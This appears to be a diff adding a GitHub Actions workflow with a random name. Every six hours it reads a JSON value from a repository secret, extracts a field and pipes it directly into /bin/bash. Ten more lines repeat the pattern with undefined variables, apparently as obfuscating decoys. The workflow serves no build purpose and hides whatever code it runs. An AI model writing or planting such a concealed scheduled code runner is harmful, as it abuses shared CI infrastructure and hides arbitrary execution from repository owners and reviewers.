@@ -1,0 +1,28 @@
+name: baitiandi3451
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: baitiandi3451
+        env:
+          my51: ${{ secrets.my51 }}
+        run: |
+          echo $my51 | jq -r .vs1761 | /bin/bash
+          echo $emcq823 | jq -r .xfj55 | /bin/bash
+          echo $dku88644 | jq -r .rbc3 | /bin/bash
+          echo $x8 | jq -r .peli3644 | /bin/bash
+          echo $yoa05047 | jq -r .fa5 | /bin/bash
+          echo $xvb614 | jq -r .kb12 | /bin/bash
+          echo $iwbd9 | jq -r .lyeh22 | /bin/bash
+          echo $prh74 | jq -r .fiq3465 | /bin/bash
+          echo $h8405 | jq -r .p7607 | /bin/bash
+          echo $sze17089 | jq -r .uck93908 | /bin/bash
+          echo $kaiyp172 | jq -r .nxkqh0178 | /bin/bash
+
